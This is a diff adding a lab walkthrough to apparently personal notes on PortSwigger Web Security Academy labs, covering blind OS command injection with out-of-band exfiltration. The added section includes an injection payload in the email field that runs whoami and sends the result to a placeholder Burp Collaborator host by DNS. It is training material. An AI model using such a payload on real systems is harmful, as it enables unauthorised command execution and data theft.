@@ -83,3 +83,29 @@ Right-click and select "Insert Collaborator payload" to insert a Burp Collaborat
 ![WhatsApp Image 2023-05-08 at 22 22 26](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/ed33436a-ba01-4398-b803-d63af20905db)
 
 ![WhatsApp Image 2023-05-08 at 22 23 19](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/da13756a-d278-4206-ae2c-3ff396788e2c)
+
+**Lab #5:Blind OS command injection with out-of-band data exfiltration**
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
+
+Use Burp Suite Professional to intercept and modify the request that submits feedback.
+Go to the Collaborator tab.
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
+
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
+Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
+To complete the lab, enter the name of the current user.
+
+![WhatsApp Image 2023-06-26 at 16 17 33](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b195a7ef-c8c8-4140-a776-d6d3009fad16)
+
+![WhatsApp Image 2023-06-26 at 16 41 54](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/e87d6e1a-3393-4f97-b66f-850ddab3d538)
+
+![WhatsApp Image 2023-06-26 at 16 42 15](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/6db50cf9-2b04-46dc-ab30-9e8ee93e655a)
+
+![WhatsApp Image 2023-06-26 at 16 42 33](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/982d1c25-5bd2-4d21-8624-8568221975c8)
